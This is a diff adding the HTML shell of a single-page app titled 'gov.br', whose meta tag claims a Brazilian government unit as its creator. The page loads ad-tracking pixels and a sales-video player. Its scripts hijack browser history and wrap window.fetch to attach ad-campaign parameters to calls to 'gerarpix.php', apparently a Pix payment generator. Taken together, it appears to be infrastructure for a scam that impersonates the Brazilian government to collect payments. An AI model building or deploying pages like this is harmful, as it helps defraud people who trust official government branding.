@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+	<script
+	src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+	data-token="7a8af025-cfdc-42f3-ace6-6da46e3c80c6"
+>
+</script>
+	<script>
+  window.pixelId = "69586c6378a57d889e187ecb";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <style data-vite-theme="" data-inject-first="">:root {
+      --background: 0 0% 100%;
+--foreground: 20 14.3% 4.1%;
+--muted: 60 4.8% 95.9%;
+--muted-foreground: 25 5.3% 44.7%;
+--popover: 0 0% 100%;
+--popover-foreground: 20 14.3% 4.1%;
+--card: 0 0% 100%;
+--card-foreground: 20 14.3% 4.1%;
+--border: 20 5.9% 90%;
+--input: 20 5.9% 90%;
+--primary: 222 47% 11%;
+--primary-foreground: 221 8% 97%;
+--secondary: 60 4.8% 95.9%;
+--secondary-foreground: 24 9.8% 10%;
+--accent: 60 4.8% 95.9%;
+--accent-foreground: 24 9.8% 10%;
+--destructive: 0 84.2% 60.2%;
+--destructive-foreground: 60 9.1% 97.8%;
+--ring: 20 14.3% 4.1%;
+--radius: 0.5rem;
+  }
+  .dark {
+      --background: 240 10% 3.9%;
+--foreground: 0 0% 98%;
+--muted: 240 3.7% 15.9%;
+--muted-foreground: 240 5% 64.9%;
+--popover: 240 10% 3.9%;
+--popover-foreground: 0 0% 98%;
+--card: 240 10% 3.9%;
+--card-foreground: 0 0% 98%;
+--border: 240 3.7% 15.9%;
+--input: 240 3.7% 15.9%;
+--primary: 222 47% 11%;
+--primary-foreground: 221 8% 97%;
+--secondary: 240 3.7% 15.9%;
+--secondary-foreground: 0 0% 98%;
+--accent: 240 3.7% 15.9%;
+--accent-foreground: 0 0% 98%;
+--destructive: 0 62.8% 30.6%;
+--destructive-foreground: 0 0% 98%;
+--ring: 240 4.9% 83.9%;
+--radius: 0.5rem;
+  }</style>
+
+  <meta charset="utf-8">
+  <title>gov.br</title>
+  <meta property="creator.productor" content="http://estruturaorganizacional.dados.gov.br/id/unidade-organizacional/2981">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap">
+  <style>
+    .sticky-nav {
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+  </style>
+  <script type="module" crossorigin src="assets/index-z-3SqSuo.js"></script>
+  <link rel="stylesheet" crossorigin href="assets/index-CfW8PI36.css">
+  <script>
+    // Mantém todos os parâmetros de window.location.search ao navegar no SPA
+    (function() {
+      // Salva window.location.search inicial
+      function saveSearchParams() {
+        var search = window.location.search;
+        if (search && search.length > 1) {
+          sessionStorage.setItem('url_search', search);
+        }
+      }
+      
+      // Pega os parâmetros salvos
+      function getSavedSearch() {
+        try {
+          return sessionStorage.getItem('url_search') || '';
+        } catch(e) {
+          return '';
+        }
+      }
+      
+      // Adiciona parâmetros salvos a uma URL
+      function addSearchToUrl(url) {
+        if (!url || url.startsWith('javascript:')) return url;
+        
+        try {
+          var savedSearch = getSavedSearch();
+          if (!savedSearch) return url;
+          
+          var urlObj = new URL(url, window.location.origin);
+          var savedParams = new URLSearchParams(savedSearch.substring(1));
+          
+          // Adiciona todos os parâmetros salvos
+          savedParams.forEach(function(value, key) {
+            if (!urlObj.searchParams.has(key)) {
+              urlObj.searchParams.set(key, value);
+            }
+          });
+          
+          return urlObj.toString();
+        } catch(e) {
+          return url;
+        }
+      }
+      
+      // Salva quando carrega
+      saveSearchParams();
+      
+      // Atualiza URL atual se necessário
+      function ensureParamsInCurrentUrl() {
+        var currentUrl = window.location.href;
+        var urlWithParams = addSearchToUrl(currentUrl);
+        if (urlWithParams !== currentUrl) {
+          history.replaceState(null, '', urlWithParams);
+        }
+      }
+      
+      // Intercepta cliques em links
+      document.addEventListener('click', function(e) {
+        var link = e.target.closest('a');
+        if (!link || !link.href) return;
+        
+        var href = link.getAttribute('href');
+        if (!href || href.startsWith('javascript:')) return;
+        
+        if (href.startsWith('/') || href.startsWith('./') || !href.startsWith('http')) {
+          var newUrl = addSearchToUrl(href);
+          if (newUrl !== href) {
+            e.preventDefault();
+            if (href.startsWith('/') || href.startsWith('./')) {
+              history.pushState(null, '', newUrl);
+              window.dispatchEvent(new PopStateEvent('popstate'));
+            } else {
+              window.location.href = newUrl;
+            }
+          }
+        } else if (href.startsWith('http')) {
+          var newUrl = addSearchToUrl(href);
+          if (newUrl !== href) {
+            e.preventDefault();
+            window.location.href = newUrl;
+          }
+        }
+      }, true);
+      
+      // Intercepta History API
+      var originalPushState = history.pushState;
+      var originalReplaceState = history.replaceState;
+      
+      history.pushState = function() {
+        var args = Array.prototype.slice.call(arguments);
+        if (args[2]) {
+          args[2] = addSearchToUrl(args[2]);
+        }
+        var result = originalPushState.apply(history, args);
+        ensureParamsInCurrentUrl();
+        return result;
+      };
+      
+      history.replaceState = function() {
+        var args = Array.prototype.slice.call(arguments);
+        if (args[2]) {
+          args[2] = addSearchToUrl(args[2]);
+        }
+        var result = originalReplaceState.apply(history, args);
+        ensureParamsInCurrentUrl();
+        return result;
+      };
+      
+      window.addEventListener('popstate', function() {
+        ensureParamsInCurrentUrl();
+      });
+      
+      // Monitora mudanças de rota
+      var lastUrl = window.location.href;
+      setInterval(function() {
+        if (window.location.href !== lastUrl) {
+          lastUrl = window.location.href;
+          ensureParamsInCurrentUrl();
+        }
+      }, 100);
+      
+      setTimeout(ensureParamsInCurrentUrl, 100);
+      setTimeout(ensureParamsInCurrentUrl, 500);
+      setTimeout(ensureParamsInCurrentUrl, 1000);
+    })();
+  </script>
+  <script>
+    (function() {
+      function substituirVideo() {
+        // Procura o vturb-smartplayer antigo
+        var playerAntigo = document.getElementById('vid-6951bdd484040898eb11aac6');
+        if (!playerAntigo) return false;
+        
+        // Encontra a div pai com classe mb-6 overflow-hidden
+        var container = playerAntigo.closest('div.mb-6.overflow-hidden');
+        if (!container) return false;
+        
+        // Verifica se já foi substituído
+        if (document.getElementById('vid-6951be1facd48189f692c4b4')) return true;
+        
+        // Limpa o container
+        container.innerHTML = '';
+        
+        // Cria o novo vturb-smartplayer
+        var novoPlayer = document.createElement('vturb-smartplayer');
+        novoPlayer.id = 'vid-6951be1facd48189f692c4b4';
+        novoPlayer.style.cssText = 'display: block; margin: 0 auto; width: 100%;';
+        container.appendChild(novoPlayer);
+        
+        // Cria e adiciona o script do player
+        var scriptTag = document.createElement('script');
+        scriptTag.type = 'text/javascript';
+        scriptTag.textContent = 'var s=document.createElement("script"); s.src="https://scripts.converteai.net/fc263f88-2f7f-4905-bd82-e268d996b6db/players/6951be1facd48189f692c4b4/v4/player.js", s.async=!0,document.head.appendChild(s);';
+        container.appendChild(scriptTag);
+        
+        console.log('✓ Vídeo substituído com sucesso!');
+        return true;
+      }
+      
+      // Tenta substituir várias vezes
+      function tentar() {
+        if (substituirVideo()) return;
+      }
+      
+      // Executa quando DOM carregar
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', function() {
+          setTimeout(tentar, 500);
+          setTimeout(tentar, 1500);
+          setTimeout(tentar, 3000);
+        });
+      } else {
+        setTimeout(tentar, 500);
+        setTimeout(tentar, 1500);
+        setTimeout(tentar, 3000);
+      }
+      
+      window.addEventListener('load', function() {
+        setTimeout(tentar, 1000);
+        setTimeout(tentar, 2000);
+        setTimeout(tentar, 5000);
+      });
+      
+      // Observer para quando React renderizar
+      var obs = new MutationObserver(function() {
+        tentar();
+      });
+      
+      setTimeout(function() {
+        var root = document.getElementById('root');
+        if (root) {
+          obs.observe(root, { childList: true, subtree: true });
+          
+          var count = 0;
+          var loop = setInterval(function() {
+            count++;
+            if (substituirVideo() || count > 100) {
+              clearInterval(loop);
+              if (count > 100) obs.disconnect();
+            }
+          }, 500);
+        }
+      }, 1000);
+    })();
+  </script>
+</head>
+<body>
+  <div id="root"></div>
+  
+  <script>
+    // Script de captura, preservação e envio de UTM para SPA React
+    (function() {
+      // ========== CAPTURA E ARMAZENAMENTO ==========
+      function capturarParametros() {
+        try {
+          var search = window.location.search;
+          if (search && search.length > 1) {
+            sessionStorage.setItem('url_search', search);
+            console.log('✅ [UTM INIT] Parâmetros capturados e salvos:', search);
+          } else {
+            var saved = sessionStorage.getItem('url_search');
+            if (saved) {
+              console.log('✅ [UTM INIT] Parâmetros já salvos anteriormente:', saved);
+            } else {
+              console.log('⚠️ [UTM INIT] Nenhum parâmetro na URL');
+            }
+          }
+        } catch (e) {
+          console.error('❌ [UTM INIT] Erro ao capturar:', e);
+        }
+      }
+      
+      capturarParametros();
+      
+      // ========== FUNÇÕES AUXILIARES ==========
+      function getSavedSearch() {
+        try {
+          return sessionStorage.getItem('url_search') || '';
+        } catch (e) {
+          return '';
+        }
+      }
+      
+      function getUtmParams() {
+        try {
+          var savedSearch = getSavedSearch();
+          
+          if (!savedSearch) {
+            var currentSearch = window.location.search;
+            if (currentSearch && currentSearch.length > 1) {
+              savedSearch = currentSearch;
+              sessionStorage.setItem('url_search', currentSearch);
+              console.log('✅ [UTM] Parâmetros recuperados da URL atual:', currentSearch);
+            }
+          }
+          
+          if (!savedSearch) {
+            return null;
+          }
+          
+          // Retorna como string no formato query string (sem o "?")
+          var utmString = savedSearch.substring(1); // Remove o "?"
+          return utmString.length > 0 ? utmString : null;
+        } catch (e) {
+          console.error('❌ [UTM] Erro ao extrair:', e);
+          return null;
+        }
+      }
+      
+      function addSearchToUrl(url) {
+        if (!url || url.startsWith('javascript:') || url.startsWith('mailto:') || url.startsWith('tel:')) {
+          return url;
+        }
+        
+        try {
+          var savedSearch = getSavedSearch();
+          if (!savedSearch) return url;
+          
+          var urlObj = new URL(url, window.location.origin);
+          var savedParams = new URLSearchParams(savedSearch.substring(1));
+          
+          savedParams.forEach(function(value, key) {
+            if (!urlObj.searchParams.has(key)) {
+              urlObj.searchParams.set(key, value);
+            }
+          });
+          
+          return urlObj.toString();
+        } catch (e) {
+          return url;
+        }
+      }
+      
+      function addParamsToCurrentUrl() {
+        try {
+          var currentUrl = window.location.href;
+          var urlWithParams = addSearchToUrl(currentUrl);
+          
+          if (urlWithParams !== currentUrl) {
+            console.log('✅ [UTM NAV] Adicionando parâmetros na URL:', urlWithParams);
+            history.replaceState(null, '', urlWithParams);
+          }
+        } catch (e) {
+          console.error('❌ [UTM NAV] Erro ao adicionar parâmetros:', e);
+        }
+      }
+      
+      // ========== INTERCEPTAR NAVEGAÇÃO SPA ==========
+      var originalPushState = history.pushState;
+      var originalReplaceState = history.replaceState;
+      
+      history.pushState = function() {
+        var args = Array.prototype.slice.call(arguments);
+        if (args[2]) {
+          var newUrl = addSearchToUrl(args[2]);
+          console.log('✅ [UTM NAV] pushState interceptado:', args[2], '→', newUrl);
+          args[2] = newUrl;
+        }
+        var result = originalPushState.apply(history, args);
+        setTimeout(addParamsToCurrentUrl, 50);
+        return result;
+      };
+      
+      history.replaceState = function() {
+        var args = Array.prototype.slice.call(arguments);
+        if (args[2]) {
+          var newUrl = addSearchToUrl(args[2]);
+          args[2] = newUrl;
+        }
+        return originalReplaceState.apply(history, args);
+      };
+      
+      // Interceptar popstate (botão voltar/avançar)
+      window.addEventListener('popstate', function() {
+        console.log('✅ [UTM NAV] popstate detectado');
+        setTimeout(addParamsToCurrentUrl, 50);
+      });
+      
+      // Verificar e adicionar parâmetros periodicamente
+      var lastUrl = window.location.href;
+      setInterval(function() {
+        var currentUrl = window.location.href;
+        if (currentUrl !== lastUrl) {
+          console.log('✅ [UTM NAV] Mudança de URL detectada:', currentUrl);
+          lastUrl = currentUrl;
+          addParamsToCurrentUrl();
+        }
+      }, 100);
+      
+      // Adicionar parâmetros após carregamento inicial
+      setTimeout(addParamsToCurrentUrl, 100);
+      setTimeout(addParamsToCurrentUrl, 500);
+      setTimeout(addParamsToCurrentUrl, 1000);
+      
+      // ========== INTERCEPTAR FETCH PARA GERARPIX.PHP ==========
+      var originalFetch = window.fetch;
+      window.fetch = function(url, options) {
+        if (typeof url === 'string' && url.includes('gerarpix.php')) {
+          console.log('='.repeat(60));
+          console.log('✅ [UTM FETCH] Interceptando gerarpix.php');
+          console.log('✅ [UTM FETCH] URL:', url);
+          
+          options = options || {};
+          
+          try {
+            var body = null;
+            
+            if (options.body) {
+              if (typeof options.body === 'string') {
+                try {
+                  body = JSON.parse(options.body);
+                  console.log('✅ [UTM FETCH] Body parseado:', body);
+                } catch (e) {
+                  console.error('❌ [UTM FETCH] Erro ao parsear JSON:', e);
+                  return originalFetch.apply(this, arguments);
+                }
+              } else {
+                body = options.body;
+              }
+            } else {
+              body = {};
+            }
+            
+            var utmString = getUtmParams();
+            console.log('✅ [UTM FETCH] UTM string obtida:', utmString);
+            
+            if (utmString && utmString.length > 0) {
+              body.utm = utmString; // String no formato "ttclid=Teste&utm_source=FB-123"
+              options.body = JSON.stringify(body);
+              console.log('✅ [UTM FETCH] Body FINAL com UTM:', options.body);
+              console.log('✅ [UTM FETCH] UTM enviado:', utmString);
+              
+              if (!options.headers) {
+                options.headers = {};
+              }
+              if (!options.headers['Content-Type']) {
+                options.headers['Content-Type'] = 'application/json';
+              }
+            } else {
+              console.log('⚠️ [UTM FETCH] Nenhum UTM para adicionar');
+            }
+            
+            console.log('='.repeat(60));
+          } catch (e) {
+            console.error('❌ [UTM FETCH] Erro crítico:', e);
+          }
+        }
+        
+        return originalFetch.apply(this, arguments);
+      };
+      
+      console.log('✅ [UTM] Script carregado! Preservando parâmetros em todas as rotas SPA.');
+    })();
+  </script>
+</body>
+</html>
